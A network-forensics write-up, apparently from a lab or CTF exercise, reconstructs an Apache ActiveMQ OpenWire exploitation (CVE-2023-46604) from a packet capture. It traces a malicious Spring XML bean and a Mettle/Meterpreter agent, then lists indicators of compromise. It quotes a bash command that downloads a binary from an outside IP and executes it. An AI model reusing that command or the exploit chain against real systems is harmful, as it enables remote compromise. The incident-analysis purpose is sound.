# OpenWire — Apache ActiveMQ RCE (CVE-2023-46604)

**Category:** Network Forensics
**Tools:** Wireshark, tshark, strings
**Skills demonstrated:** protocol identification, exploit-chain reconstruction, payload analysis, malware identification from strings in encrypted traffic

\---

## Scenario

Only a PCAP was provided. The task: reconstruct the intrusion — how the attacker
gained code execution, what was delivered, and how the compromised host was
controlled.

\---

## Investigation

**1. Protocol identification.** Reviewing the capture, most traffic used standard
HTTP/HTTPS ports, but one service stood out: **port 61616**, the default for the
**OpenWire** binary protocol used by **Apache ActiveMQ** — a Java message broker
(middleware that routes messages between programs, like a post office for software).

**2. The vulnerability.** OpenWire allows a client to send a **serialized** message
that instructs the server to instantiate a Java class with a given argument.
(Serialization = packing an object into bytes to send over the network;
deserialization = rebuilding it on the other end.) In **CVE-2023-46604**, ActiveMQ
did not validate *which* class it was told to instantiate when deserializing the
message — so an attacker can make the broker instantiate an arbitrary class with an
arbitrary argument. No authentication is required; a single crafted OpenWire packet
is enough.

**3. Exploitation → malicious Spring config.** The attacker abused this to make
ActiveMQ fetch and process a remote Spring XML file (`invoice.xml`), observed in the
following TCP streams. The XML defines a bean of class **`java.lang.ProcessBuilder`**
with `init-method="start"`, so on creation it executes an OS command:

```
bash -c "curl -s -o /tmp/docker http://128.199.52.72/docker; chmod +x /tmp/docker; ./tmp/docker"
```

**4. Second-stage payload.** This downloaded a file named **`docker`** (a disguised
name — not the container platform) from `128.199.52.72`, made it executable, and ran
it.

**5. Command \& Control.** The final TCP stream (\~4,800 packets, mbedTLS-encrypted) is
the agent's C2 session. Although the payload traffic is encrypted, the binary's own
code strings leaked in the stream and identify it: repeated `/mettle/mettle/src/...`
paths, `mettlesploit!`, and `MSF\_LICENSE`. The payload is **Mettle** — the modern,
Linux/musl implementation of Metasploit's **Meterpreter**. The leaked strings expose
its capabilities (in-memory execution, process control, networking/pivoting,
microphone capture, memory read/write). This confirms an interactive remote-control
channel; the encrypted content means actual data exfiltration cannot be confirmed
from the capture.

\---

## Attack Chain

```
Crafted OpenWire packet → ActiveMQ :61616 (CVE-2023-46604, unauthenticated)
   → broker instantiates a Spring context from attacker URL
   → fetches invoice.xml (ProcessBuilder bean, init-method=start)
   → bash: curl /tmp/docker → chmod +x → execute
   → docker = Mettle / Meterpreter agent
   → encrypted C2 session
```

*Note: how the attacker reached the broker's port (internet-exposed service vs. prior
internal foothold) is not determinable from the PCAP alone.*

\---

## Indicators of Compromise

|Type|Value|
|-|-|
|Vulnerability|CVE-2023-46604 (Apache ActiveMQ OpenWire RCE)|
|Exploited service / port|Apache ActiveMQ / 61616|
|Java class abused|java.lang.ProcessBuilder (via Spring XML)|
|Malicious config|invoice.xml|
|Payload-serving host|128.199.52.72 (served `docker`)|
|Dropped payload|/tmp/docker (Mettle / Meterpreter)|
|C2|146.190.21.92|

\---

## Summary

An unauthenticated OpenWire deserialization flaw (CVE-2023-46604) let the attacker
make an Apache ActiveMQ broker fetch and execute a malicious Spring configuration. The
config used `ProcessBuilder` to run a bash command that downloaded and executed a
Mettle/Meterpreter agent, which then opened an encrypted C2 channel.

**Takeaway:** the malware family was identified from an **encrypted** stream without
decrypting a single byte — the agent's compiled-in code strings (`/mettle/src/`,
`mettlesploit!`) fingerprinted it as Meterpreter. When C2 traffic is encrypted, the
payload's own strings are often enough to identify the tool and its capabilities.

